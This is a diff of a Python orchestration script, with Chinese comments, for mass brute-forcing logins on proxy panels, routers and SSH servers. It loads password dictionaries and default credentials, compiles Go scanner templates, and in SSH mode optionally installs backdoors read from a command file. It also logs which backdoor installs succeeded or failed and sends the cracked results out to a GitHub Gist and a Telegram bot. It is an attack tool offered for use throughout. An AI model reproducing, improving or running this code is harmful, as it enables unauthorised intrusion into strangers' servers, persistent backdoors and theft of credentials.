+                passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
+            else:
+                passwords = ["2cXaAxRGfddmGz2yx1wA"]
+        else:
+            if USE_CUSTOM_DICT:
+                if not os.path.exists("username.txt") or not os.path.exists("password.txt"): print("❌ 错误: 缺少 username.txt 或 password.txt"); sys.exit(1)
+                usernames = [line for line in open("username.txt", encoding='utf-8').read().splitlines() if line.strip()]
+                passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
+            else:
+                if TEMPLATE_MODE == 3: usernames, passwords = ["sysadmin"], ["sysadmin"]
+                elif TEMPLATE_MODE == 8: usernames, passwords = ["root"], ["password"]
+                else: usernames, passwords = ["admin"], ["admin"]
+        
+        # --- Go模板选择 ---
+        template_map = { 1: generate_xui_go, 2: generate_xui_go_template2, 3: generate_xui_go_template3, 4: generate_xui_go_template4, 5: generate_xui_go_template5, 6: generate_xui_go_template6, 7: generate_xui_go_template7, 8: generate_xui_go_template8 }
+        gen_func = template_map.get(TEMPLATE_MODE)
+        if not gen_func: print(f"❌ 错误: 无效的模板模式 {TEMPLATE_MODE}"); sys.exit(1)
+        # 准备参数
+        gen_args = (int(os.environ.get("SEMAPHORE_SIZE", "250")), usernames, passwords)
+        if TEMPLATE_MODE == 6:
+            # SSH模式需要额外参数
+            INSTALL_BACKDOOR = os.environ.get("INSTALL_BACKDOOR", "false").lower() == "true"
+            CUSTOM_BACKDOOR_CMDS = []
+            if INSTALL_BACKDOOR:
+                if not os.path.exists("后门命令.txt"): print("❌ 错误: 缺少 '后门命令.txt'"); sys.exit(1)
+                with open("后门命令.txt", encoding='utf-8') as f: CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]
+            gen_args = (int(os.environ.get("SEMAPHORE_SIZE", "250")), usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)
+        gen_func(*gen_args)
+        
+        executable = compile_go_program(TEMPLATE_MODE)
+        all_parts = split_file(os.environ.get("INPUT_FILE", "1.txt"), int(os.environ.get("LINES_PER_FILE", "5000")))
+        
+        while True:
+            if SHUTDOWN_REQUESTED: print("主循环检测到关闭请求，正在退出..."); break
+            if time.time() - JOB_START_TIME > JOB_TIMEOUT_SECONDS: print("⏱️ 作业时间接近5小时上限，优雅退出，等待下一个作业接力。"); break
 
-        beijing_time = datetime.now(timezone.utc).replace(tzinfo=timezone.utc) + timedelta(hours=8)
-        time_str = beijing_time.strftime("%Y%m%d-%H%M")
-        mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "ssh", 7: "substore", 8: "OpenWrt"}
-        prefix = mode_map.get(TEMPLATE_MODE, "result")
+            completed_parts = progress_data.get("completed_parts", [])
+            next_part = next((p for p in all_parts if p not in completed_parts), None)
 
-        def rename_and_track(original, new_name_template):
-            if os.path.exists(original) and os.path.getsize(original) > 0:
-                new_name = new_name_template.format(prefix=prefix, time=time_str)
-                os.rename(original, new_name)
-                final_result_files[original] = new_name
-                print(f"✅ 结果文件已生成: {new_name}")
+            if next_part is None: print("✅ 所有文件分片均已处理完毕！"); break
 
-        rename_and_track("xui.txt", "{prefix}-{time}.txt")
-        rename_and_track("xui.xlsx", "{prefix}-{time}.xlsx")
-        rename_and_track("hmsuccess.txt", "后门安装成功-{time}.txt")
-        rename_and_track("hmfail.txt", "后门安装失败-{time}.txt")
+            success = run_single_part(executable, next_part)
+
+            if success:
+                progress_data.setdefault("completed_parts", []).append(next_part)
+                update_gist_file(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME, json.dumps(progress_data, indent=2))
+
+        is_all_done = set(all_parts) == set(progress_data.get("completed_parts", []))
+        if is_all_done:
+            print("\n🎉🎉🎉 所有任务分片均已成功处理！开始最后的数据整合和通知。🎉🎉🎉")
+            generate_ipcx_py()
+            merge_xui_files()
+            merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
+            merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
+            run_ipcx()
+            
+            final_result_files = {}
+            beijing_time = datetime.now(timezone.utc).replace(tzinfo=timezone.utc) + timedelta(hours=8)
+            time_str = beijing_time.strftime("%Y%m%d-%H%M")
+            mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "ssh", 7: "substore", 8: "OpenWrt"}
+            prefix = mode_map.get(TEMPLATE_MODE, "result")
+
+            def rename_and_track(original, new_name_template):
+                if os.path.exists(original) and os.path.getsize(original) > 0:
+                    new_name = new_name_template.format(prefix=prefix, time=time_str)
+                    os.rename(original, new_name)
+                    final_result_files[original] = new_name
+                    print(f"✅ 结果文件已生成: {new_name}")
+
+            rename_and_track("xui.txt", "{prefix}-{time}.txt")
+            rename_and_track("xui.xlsx", "{prefix}-{time}.xlsx")
+            rename_and_track("hmsuccess.txt", "后门安装成功-{time}.txt")
+            rename_and_track("hmfail.txt", "后门安装失败-{time}.txt")
+
+            for final_name in final_result_files.values():
+                if final_name.endswith(".txt") and os.path.exists(final_name):
+                    try:
+                        with open(final_name, 'r', encoding='utf-8', errors='ignore') as f:
+                            content = f.read()
+                        update_gist_file(GIST_ID, GITHUB_TOKEN, final_name, content)
+                    except Exception as e:
+                        print(f"❌ 读取或上传 Gist 文件 {final_name} 时出错: {e}")
+
+            def send_to_telegram(file_path, bot_token, chat_id):
+                if not bot_token or not chat_id: return
+                if not os.path.exists(file_path): return
+                print(f"📤 正在将 {file_path} 上传至 Telegram ...")
+                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                with open(file_path, "rb") as f:
+                    files = {'document': f}
+                    data = {'chat_id': chat_id, 'caption': f"爆破结果：{os.path.basename(file_path)}"}
+                    try:
+                        response = requests.post(url, data=data, files=files, timeout=60)
+                        if response.status_code == 200: print(f"✅ 文件 {file_path} 已发送到 Telegram")
+                        else: print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
+                    except Exception as e: print(f"❌ 发送到 TG 失败：{e}")
+
+            for final_name in final_result_files.values():
+                send_to_telegram(final_name, BOT_TOKEN, CHAT_ID)
+            
+            print(f"ℹ️ 正在清理 Gist 中的进度文件 '{PROGRESS_FILE_NAME}'...")
+            update_gist_file(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME, "{}")
 
     except Exception as e:
         print(f"❌ 脚本执行过程中发生致命错误: {e}")
+        update_gist_file(GIST_ID, GITHUB_TOKEN, PROGRESS_FILE_NAME, json.dumps(progress_data, indent=2))
         sys.exit(1)
     finally:
         clean_temp_files()
         end = time.time()
-        cost = int(end - start)
-        print(f"\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
-
-        for original, final_name in final_result_files.items():
-            if os.path.exists(final_name):
-                with open(final_name, 'r', encoding='utf-8') as f:
-                    content = f.read()
-                upload_to_gist(GIST_ID, GITHUB_TOKEN, final_name, content)
-
-        def send_to_telegram(file_path, bot_token, chat_id):
-            if not bot_token or not chat_id:
-                print("⚠️ 未提供 TELEGRAM_BOT_TOKEN 或 TELEGRAM_CHAT_ID，跳过发送到 Telegram。")
-                return
-            if not os.path.exists(file_path):
-                return
-            
-            print(f"📤 正在将 {file_path} 上传至 Telegram ...")
-            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-            with open(file_path, "rb") as f:
-                files = {'document': f}
-                data = {'chat_id': chat_id, 'caption': f"爆破结果：{os.path.basename(file_path)}"}
-                try:
-                    response = requests.post(url, data=data, files=files, timeout=60)
-                    if response.status_code == 200:
-                        print(f"✅ 文件 {file_path} 已发送到 Telegram")
-                    else:
-                        print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
-                except Exception as e:
-                    print(f"❌ 发送到 TG 失败：{e}")
-
-        for final_name in final_result_files.values():
-            send_to_telegram(final_name, BOT_TOKEN, CHAT_ID)
-
+        cost = int(end - JOB_START_TIME)
+        print(f"\n=== 本次作业运行结束！用时 {cost // 60} 分 {cost % 60} 秒 ===")
